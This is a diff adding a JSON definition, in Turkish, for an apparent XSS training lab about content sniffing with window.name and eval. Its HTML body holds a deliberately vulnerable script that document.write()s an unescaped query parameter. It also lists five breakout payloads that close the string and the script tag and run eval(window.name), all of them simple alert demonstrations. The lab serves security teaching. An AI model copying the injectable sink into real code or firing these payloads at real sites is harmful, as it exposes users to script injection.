@@ -1,0 +1,20 @@
+{
+  "title": "Content Sniffing XSS - window.name + eval",
+  "description": "JSON yanıtının MIME sniffing ile HTML olarak yorumlanmasını kullanarak window.name değişkenine JavaScript kodu yerleştirip eval() ile çalıştırarak XSS tetikleyin.",
+  "objectives": [
+    "JSON string'inden kaçın.",
+    "window.name'e çalıştırılabilir JS kodu koyun.",
+    "eval() fonksiyonu ile kodu çalıştırarak XSS tetikleyin."
+  ],
+  "hints": [
+    "String'i \\\" ile kapatın.",
+    "} ve </script> ile mevcut script tag'ini kapatın.",
+    "window.name = 'alert(\"XSS\")' veya daha karmaşık JS kodu",
+    "eval(window.name) ile kodu çalıştırın."
+  ],
+  "difficulty": "medium",
+  "category": "content-sniffing",
+  "risk": "high",
+  "status": "active",
+  "body": "<div style='font-family: Arial; padding:20px;'><h2>Content Sniffing XSS - window.name + eval</h2><p>window.name ve eval kullanarak XSS tetikleyin.</p><pre id='json-box' style='background:#222; padding:10px; color:#0f0; margin:20px 0;'></pre><div style='padding:20px; background:#222; border:1px solid #444; color:#eee;'><strong>Tüm Payload'lar (q parametresine ekleyin)</strong><ul style='margin:15px 0; line-height:2;'><li><strong>1. Basit alert (en garanti):</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='alert(\\\"XSS via window.name + eval\\\")';eval(window.name)&lt;/script&gt;</code></li><li><strong>2. alert(1):</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='alert(1)';eval(window.name)&lt;/script&gt;</code></li><li><strong>3. alert(document.domain):</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='alert(document.domain)';eval(window.name)&lt;/script&gt;</code></li><li><strong>4. Konsola yaz + alert:</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='console.log(\\\"XSS successful\\\");alert(\\\"XSS via eval\\\")';eval(window.name)&lt;/script&gt;</code></li><li><strong>5. Daha karmaşık (başlık değiştir + alert):</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='document.title=\\\"Pwned\\\";alert(\\\"XSS\\\")';eval(window.name)&lt;/script&gt;</code></li></ul><p><strong>Tavsiye:</strong> 1 veya 2 numaralı payload ile anında alert göreceksin.</p></div><script>const p=new URLSearchParams(location.search);const q=p.get('q')||'';const json=`{\"data\":\"${q}\"}`;document.getElementById('json-box').textContent=json;document.write(json);</script></div>"
+}
